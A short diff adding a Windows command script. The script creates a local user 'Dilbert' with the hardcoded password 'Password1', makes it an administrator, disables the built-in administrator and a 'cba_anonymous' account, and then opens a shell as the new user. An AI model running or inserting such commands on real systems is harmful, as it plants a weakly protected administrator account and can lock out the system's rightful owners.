@@ -1,0 +1,9 @@
+net user /add Dilbert Password1
+net localgroup administrators Dilbert /add
+net localgroup administrators
+net user administrator /active:no
+net user cba_anonymous /active:no
+gpupdate /force
+runas /user:Dilbert cmd
+
+
